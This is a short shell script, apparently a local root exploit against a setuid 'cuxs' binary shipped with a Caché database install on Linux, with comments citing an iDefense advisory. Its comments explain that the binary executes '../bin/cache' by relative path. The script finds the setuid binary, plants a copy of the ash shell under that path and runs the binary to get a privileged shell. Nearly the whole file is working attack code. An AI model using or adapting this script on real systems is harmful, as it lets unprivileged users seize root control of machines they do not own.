#!/bin/sh
# kokaninATdtors playing with 5.0.2.607.1_linux_su.tar (cache) on leenooks.
# this started as an exploit for scenario1 in
# http://www.idefense.com/advisory/07.01.03.txt, but ended up as something else
# A snippetisnip from an strace of the cuxs binary shows:
# execve("../bin/cache", ["cache"], [/* 19 vars */])
# -------^^^^^^^^^^^^^^------- which is stupid stupid stupid since cuxs is +s

TARGET=`find / -type f -name cuxs -perm -4000 2>/dev/null`
mkdir -p crapche/bin
cd crapche/bin
cp `which ash` cache
$TARGET
